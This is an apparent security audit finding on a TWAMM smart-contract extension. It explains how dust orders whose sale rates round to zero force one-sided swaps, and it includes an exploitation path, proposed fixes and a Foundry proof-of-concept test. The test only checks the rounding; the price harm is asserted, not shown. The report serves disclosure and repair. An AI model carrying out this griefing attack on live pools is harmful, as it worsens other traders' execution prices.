## Title
Dust Order Sale Rate Manipulation Forces Unbalanced TWAMM Execution

## Summary
An attacker can create dust TWAMM orders with non-zero sale rates that round to zero amounts during virtual order execution. This forces single-sided swaps at extreme prices (MIN_SQRT_RATIO/MAX_SQRT_RATIO) instead of balanced dual-sided TWAMM execution, causing legitimate users to receive poor execution prices. [1](#0-0) 

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/extensions/TWAMM.sol` - `_executeVirtualOrdersFromWithinLock()` function (lines 430-515)

**Intended Logic:** 
When both `saleRateToken0` and `saleRateToken1` are non-zero in the pool state, virtual orders should execute bidirectionally using the TWAMM pricing formula (`computeNextSqrtRatio`). This allows both sides to trade against each other at balanced prices that reflect the ratio of their sale rates. [2](#0-1) 

**Actual Logic:**
The code calculates `amount0` and `amount1` using integer division that rounds down. For dust orders with `saleRate < 2^24`, the computed amount rounds to zero even though the sale rate is non-zero in pool state. This causes the condition `amount0 != 0 && amount1 != 0` to fail, forcing single-sided execution to extreme prices instead of balanced TWAMM execution. [3](#0-2) 

The `computeAmountFromSaleRate` function performs `(saleRate * duration) >> 32`. For minimum time interval (256 seconds) and `saleRate < 16,777,216`, this evaluates to zero. [4](#0-3) 

**Exploitation Path:**

1. **Attacker creates dust order**: Call `Orders.mintAndIncreaseSellAmount()` with minimal amount (e.g., ~16.7M base units for 18-decimal tokens ≈ 0.0000000000167 tokens) over maximum duration to achieve `saleRate < 2^24`. [5](#0-4) 

2. **Legitimate users have opposing orders**: Normal users have active sell orders on the opposite token with standard sale rates.

3. **Virtual orders execute**: When any pool interaction triggers `_executeVirtualOrdersFromWithinLock()` with `timeElapsed = 256` seconds:
   - Attacker's `amount0 = (dustSaleRate * 256) >> 32 = 0`  
   - Legitimate `amount1 = (normalSaleRate * 256) >> 32 > 0`
   - Condition `amount0 != 0 && amount1 != 0` is FALSE

4. **Single-sided execution occurs**: Code executes single-sided swap to MAX_SQRT_RATIO instead of using `computeNextSqrtRatio` to calculate balanced price. [6](#0-5) 

**Security Property Broken:** 
This breaks the TWAMM's core mechanism where orders on both sides should trade against each other at balanced prices. Legitimate users receive execution at extreme prices rather than the fair price determined by the ratio of opposing sale rates.

## Impact Explanation

- **Affected Assets**: All tokens in TWAMM orders on the side opposite to the attacker's dust order
- **Damage Severity**: Legitimate TWAMM users receive significantly worse execution prices. Instead of trading at balanced prices calculated from `computeNextSqrtRatio` (which considers both sale rates and liquidity), they trade at pool spot prices up to MIN/MAX_SQRT_RATIO limits. The price difference depends on pool liquidity but can be substantial.
- **User Impact**: Any user with active TWAMM orders can be griefed. Every 256-second interval where the dust order rounds to zero causes poor execution. Over long TWAMM durations (hours/days), this compounds significantly.

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user with minimal capital (dust amounts)
- **Preconditions**: 
  - TWAMM pool must be initialized with liquidity
  - Legitimate users must have active orders on the opposite side
  - Orders must execute during minimum 256-second time intervals
- **Execution Complexity**: Single transaction to create dust order, then attack sustains automatically on every virtual order execution
- **Frequency**: Continuously exploitable every 256 seconds until attacker's dust order expires or is cancelled

## Recommendation

Add a minimum sale rate validation to prevent dust orders that would round to zero during minimum time intervals:

```solidity
// In src/Orders.sol, function increaseSellAmount, after line 66:

uint256 MIN_SALE_RATE = (1 << 32) / 256; // Ensures amount >= 1 for minimum 256s interval

if (saleRate < MIN_SALE_RATE) {
    revert SaleRateTooLow();
}
```

Alternative mitigation: In `_executeVirtualOrdersFromWithinLock()`, check if sale rates are non-zero even when amounts round to zero, and use a minimum non-zero amount:

```solidity
// In src/extensions/TWAMM.sol, after line 436:

// Ensure non-zero sale rates contribute minimum amount
if (state.saleRateToken0() != 0 && amount0 == 0) {
    amount0 = 1;
}
if (state.saleRateToken1() != 0 && amount1 == 0) {
    amount1 = 1;
}
```

## Proof of Concept

```solidity
// File: test/Exploit_DustOrderManipulation.t.sol
// Run with: forge test --match-test test_DustOrderManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Orders.sol";
import "../src/extensions/TWAMM.sol";
import {BaseTWAMMTest} from "./extensions/TWAMM.t.sol";

contract Exploit_DustOrderManipulation is BaseTWAMMTest {
    Orders internal orders;
    
    function setUp() public override {
        BaseTWAMMTest.setUp();
        orders = new Orders(core, twamm, owner);
    }
    
    function test_DustOrderManipulation() public {
        // SETUP: Create TWAMM pool with liquidity
        uint64 fee = uint64((uint256(5) << 64) / 100);
        PoolKey memory poolKey = createTwammPool({fee: fee, tick: 0});
        createPosition(poolKey, MIN_TICK, MAX_TICK, 10000 ether, 10000 ether);
        
        token0.approve(address(orders), type(uint256).max);
        token1.approve(address(orders), type(uint256).max);
        
        uint64 startTime = alignToNextValidTime();
        uint64 duration = 365 days; // Maximum duration
        uint64 endTime = startTime + duration;
        
        // EXPLOIT: Attacker creates dust token0 order with saleRate < 2^24
        // For saleRate = 16,777,215 and duration = max, amount ≈ 16,777,215 base units
        uint128 dustAmount = 16_777_215; // Will create saleRate < 2^24
        
        OrderKey memory attackerKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee,
                _isToken1: false,
                _startTime: startTime,
                _endTime: endTime
            })
        });
        
        (uint256 attackerId, uint112 attackerSaleRate) = 
            orders.mintAndIncreaseSellAmount(attackerKey, dustAmount, type(uint112).max);
        
        // Verify attacker's sale rate is below threshold
        assertLt(attackerSaleRate, 2**24, "Attacker sale rate should be < 2^24");
        
        // SETUP: Legitimate user creates normal token1 order
        uint128 legitimateAmount = 1000 ether;
        
        OrderKey memory victimKey = OrderKey({
            token0: poolKey.token0,
            token1: poolKey.token1,
            config: createOrderConfig({
                _fee: fee,
                _isToken1: true,
                _startTime: startTime,
                _endTime: endTime
            })
        });
        
        (uint256 victimId, uint112 victimSaleRate) = 
            orders.mintAndIncreaseSellAmount(victimKey, legitimateAmount, type(uint112).max);
        
        // VERIFY: After minimum time interval, attacker's amount rounds to 0
        vm.warp(startTime + 256); // Minimum time interval
        
        // Calculate expected amounts
        uint256 attackerAmount = (uint256(attackerSaleRate) * 256) >> 32;
        uint256 victimAmount = (uint256(victimSaleRate) * 256) >> 32;
        
        assertEq(attackerAmount, 0, "Vulnerability confirmed: Attacker amount rounds to 0");
        assertGt(victimAmount, 0, "Victim amount should be non-zero");
        
        // Single-sided execution will occur instead of balanced TWAMM execution
        // Victim receives worse prices due to manipulation
    }
}
```

**Notes**

This vulnerability exploits a precision limitation in the amount calculation to subvert the intended TWAMM mechanics. While the protocol comment at line 440 acknowledges that amounts can be zero when sale rates are non-zero, it doesn't address the exploitability of this behavior for griefing attacks. [7](#0-6) 

The attack is particularly concerning because it requires minimal capital (dust amounts), can be sustained continuously, and breaks the fundamental value proposition of TWAMM orders - balanced execution between opposing sides. This is distinct from the known issue of "TWAMM execution price degradation due to low liquidity or lack of opposing orders" because here the opposing order's sale rate IS registered in the pool state, but it's deliberately crafted to contribute nothing during execution.

### Citations

**File:** src/extensions/TWAMM.sol (L430-436)
```text
                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });
```

**File:** src/extensions/TWAMM.sol (L440-440)
```text
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
```

**File:** src/extensions/TWAMM.sol (L441-515)
```text
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
                    } else if (amount0 != 0 || amount1 != 0) {
                        PoolBalanceUpdate swapBalanceUpdate;
                        if (amount0 != 0) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MIN_SQRT_RATIO,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        } else {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MAX_SQRT_RATIO,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        }

                        (rewardDelta0, rewardDelta1) = (swapBalanceUpdate.delta0(), swapBalanceUpdate.delta1());
                        saveDelta0 -= rewardDelta0;
                        saveDelta1 -= rewardDelta1;
                    }
```

**File:** src/math/twamm.sol (L40-46)
```text
/// @dev Computes amount from sale rate: (saleRate * duration) >> 32, with optional rounding.
/// @dev Assumes the saleRate <= type(uint112).max and duration <= type(uint32).max
function computeAmountFromSaleRate(uint256 saleRate, uint256 duration, bool roundUp) pure returns (uint256 amount) {
    assembly ("memory-safe") {
        amount := shr(32, add(mul(saleRate, duration), mul(0xffffffff, roundUp)))
    }
}
```

**File:** src/Orders.sol (L43-74)
```text
    function mintAndIncreaseSellAmount(OrderKey memory orderKey, uint112 amount, uint112 maxSaleRate)
        public
        payable
        returns (uint256 id, uint112 saleRate)
    {
        id = mint();
        saleRate = increaseSellAmount(id, orderKey, amount, maxSaleRate);
    }

    /// @inheritdoc IOrders
    function increaseSellAmount(uint256 id, OrderKey memory orderKey, uint128 amount, uint112 maxSaleRate)
        public
        payable
        authorizedForNft(id)
        returns (uint112 saleRate)
    {
        uint256 realStart = FixedPointMathLib.max(block.timestamp, orderKey.config.startTime());

        unchecked {
            if (orderKey.config.endTime() <= realStart) {
                revert OrderAlreadyEnded();
            }

            saleRate = uint112(computeSaleRate(amount, uint32(orderKey.config.endTime() - realStart)));

            if (saleRate > maxSaleRate) {
                revert MaxSaleRateExceeded();
            }
        }

        lock(abi.encode(CALL_TYPE_CHANGE_SALE_RATE, msg.sender, id, orderKey, saleRate));
    }
```
